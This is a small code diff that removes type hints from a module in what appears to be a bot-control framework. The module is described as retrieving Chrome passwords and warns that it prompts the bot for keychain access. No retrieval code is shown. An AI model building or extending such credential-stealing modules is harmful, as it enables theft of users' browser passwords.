@@ -6,7 +6,7 @@ from server.modules.helper import *
 
 
 class Module(ModuleABC):
-    def get_info(self) -> dict:
+    def get_info(self):
         return {
             "Author:": ["Marten4n6"],
             "Description": "Retrieve Chrome passwords.",
@@ -16,7 +16,7 @@ class Module(ModuleABC):
             "Stoppable": False
         }
 
-    def setup(self, set_options: list) -> Tuple[bool, Optional[dict]]:
+    def setup(self, set_options):
         confirm = self._view.should_continue([
             "This will prompt the bot to allow keychain access."
         ])
